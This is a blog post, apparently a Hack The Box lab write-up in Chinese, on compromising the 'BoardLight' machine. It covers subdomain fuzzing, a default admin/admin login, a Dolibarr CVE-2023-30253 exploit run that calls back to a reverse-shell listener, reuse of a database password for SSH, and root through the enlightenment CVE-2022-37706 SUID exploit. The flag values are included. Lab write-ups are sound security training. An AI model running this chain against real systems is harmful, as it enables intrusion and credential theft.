@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Recon❯ sudo nmap -sCV 10.10.11.11 Password: Starting Nmap 7.98 ( https:&#x2F;&#x2F;nmap.org ) at 2025-10-05 11:12 +0800 Nmap scan report for 10.10.11.11 (10.10.11.11) Host is up (0.35s latency). Not shown: 99">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BoardLight">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/10/06/BoardLight/index.html">
+<meta property="og:site_name" content="Eur3ka&#39;s Studio">
+<meta property="og:description" content="Recon❯ sudo nmap -sCV 10.10.11.11 Password: Starting Nmap 7.98 ( https:&#x2F;&#x2F;nmap.org ) at 2025-10-05 11:12 +0800 Nmap scan report for 10.10.11.11 (10.10.11.11) Host is up (0.35s latency). Not shown: 99">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/06/BoardLight/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/06/BoardLight/2.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/06/BoardLight/3.png">
+<meta property="article:published_time" content="2025-10-05T16:17:59.000Z">
+<meta property="article:modified_time" content="2025-10-06T14:42:53.163Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/10/06/BoardLight/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/10/06/BoardLight/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/10/06/BoardLight/","path":"2025/10/06/BoardLight/","title":"BoardLight"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>BoardLight | Eur3ka's Studio</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eur3ka's Studio</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-larissa"><span class="nav-number">2.</span> <span class="nav-text">Shell as larissa</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-root"><span class="nav-number">3.</span> <span class="nav-text">Shell as root</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xu Haoxiang"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description">Never again.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/10/06/BoardLight/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eur3ka's Studio">
+      <meta itemprop="description" content="Never again.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="BoardLight | Eur3ka's Studio">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BoardLight
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-10-06 00:17:59 / Modified: 22:42:53" itemprop="dateCreated datePublished" datetime="2025-10-06T00:17:59+08:00">2025-10-06</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><pre><code>❯ sudo nmap -sCV 10.10.11.11
+Password:
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-05 11:12 +0800
+Nmap scan report for 10.10.11.11 (10.10.11.11)
+Host is up (0.35s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.63 seconds
+</code></pre>
+<p>还是最基本的nmap 还是熟悉的配方80+22 访问页面并不能找到有意思的地方 遂查看源码</p>
+<p><img src="/2025/10/06/BoardLight/1.png"></p>
+<p>在页脚处看到了域名 由于上次做过类似的题目 于是尝试扫一下子域名</p>
+<pre><code>❯ ffuf -w subdomains-10000.txt -u http://10.10.11.11 -H &#39;Host: FUZZ.board.htb&#39; -fw 6243
+
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.11
+ :: Wordlist         : FUZZ: /Users/joe/Documents/Red/SecDictionary/Subdomain_List/subdomains-10000.txt
+ :: Header           : Host: FUZZ.board.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 6243
+________________________________________________
+
+crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 277ms]
+:: Progress: [11779/11779] :: Job [1/1] :: 130 req/sec :: Duration: [0:01:23] :: Errors: 0 ::
+</code></pre>
+<p>因为扫描时发现状态码都是200 只是返回长度不一样 于是使用<code>-fw 6243</code>来过滤</p>
+<pre><code>host                    [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 273ms]
+crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 277ms]
+mail1                   [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 277ms]
+</code></pre>
+<p>添加hosts之后访问域名 映入眼帘的是登陆框 属于Dolibarr应用 默认用户名应该是admin 尝试用burpsuite跑一下 </p>
+<p><img src="/2025/10/06/BoardLight/2.png"></p>
+<p>后来发现是重定向加token的情况 之前看不清是从哪个payload开始重定向 于是乎勾选重定向后发现了是admin&#x2F;admin登陆</p>
+<p><img src="/2025/10/06/BoardLight/3.png"></p>
+<h1 id="Shell-as-larissa"><a href="#Shell-as-larissa" class="headerlink" title="Shell as larissa"></a>Shell as larissa</h1><p>成功登陆之后发现基本上没有权限可用 于是乎试着找一下洞 成功找到<code>CVE-2023-30253</code>的洞并使用exp打进去</p>
+<pre><code>❯ python3 exploit.py http://crm.board.htb admin admin 10.10.X.X 4444
+[*] Trying authentication...
+[**] Login: admin
+[**] Password: admin
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
+
+❯ nc -lv 4444
+bash: cannot set terminal process group (849): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
+</code></pre>
+<p>连接进去之后发现是www用户 也是一样并没有什么权限 想着php框架大概率会有mysql的数据库 于是找到conf文件夹后 在配置conf.php中找到了连接数据库密码 并成功复用登陆至larissa</p>
+<pre><code>...
+$dolibarr_main_db_host=&#39;localhost&#39;;
+$dolibarr_main_db_port=&#39;3306&#39;;
+$dolibarr_main_db_name=&#39;dolibarr&#39;;
+$dolibarr_main_db_prefix=&#39;llx_&#39;;
+$dolibarr_main_db_user=&#39;dolibarrowner&#39;;
+$dolibarr_main_db_pass=&#39;serverfun2$2023!!&#39;;
+$dolibarr_main_db_type=&#39;mysqli&#39;;
+...
+
+❯ ssh larissa@10.10.11.11
+The authenticity of host &#39;10.10.11.11 (10.10.11.11)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.11&#39; (ED25519) to the list of known hosts.
+larissa@10.10.11.11&#39;s password:
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+larissa@boardlight:~$ cat user.txt
+f3c8f46b2c23a2ec6b0ee9ed7463c226
+</code></pre>
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><p>登陆larissa之后 发现没有sudo的权限 那么上传linpeas看看</p>
+<pre><code>...
+Vulnerable to CVE-2021-3560
+...
+</code></pre>
+<p>觉得有戏 但是不知道为什么连不上reverse_shell 查了一圈也没发现有人这样做 于是放弃 继续向下寻找</p>
+<pre><code>══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
+                      ╚════════════════════════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
+-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-sr-x 1 root root 15K Apr  8  2024 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys  ---&gt;  Before_0.25.4_(CVE-2022-37706)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd  ---&gt;  Before_0.25.4_(CVE-2022-37706)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight  ---&gt;  Before_0.25.4_(CVE-2022-37706)
+</code></pre>
+<p>这个洞比较简单 打就完了</p>
+<pre><code>larissa@boardlight:~$ chmod +x exploit.sh
+larissa@boardlight:~$ ./exploit.sh
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can&#39;t find in /etc/fstab.
+# cat /root/root.txt
+f72be6a718b053b9a2320048186075b2
+</code></pre>
+<p>这个靶机是有点简单了</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HTB/" rel="tag"># HTB</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/25/Driver/" rel="prev" title="Driver">
+                  <i class="fa fa-angle-left"></i> Driver
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
